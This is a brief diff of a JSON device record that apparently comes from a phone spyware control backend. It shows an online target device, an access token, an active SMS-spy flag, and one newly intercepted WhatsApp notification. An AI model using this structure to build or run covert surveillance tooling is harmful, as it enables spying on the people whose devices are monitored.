@@ -4,7 +4,7 @@
     "deviceName": "HP-4045-4351",
     "ownerUsername": "rizz tuer",
     "token": "1ea24d96a5a50eac66ba80cd7678f908",
-    "lastSeen": 1775615739302,
+    "lastSeen": 1775615754238,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T02:20:09.530Z",
@@ -19,7 +19,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "08/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775615755990
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
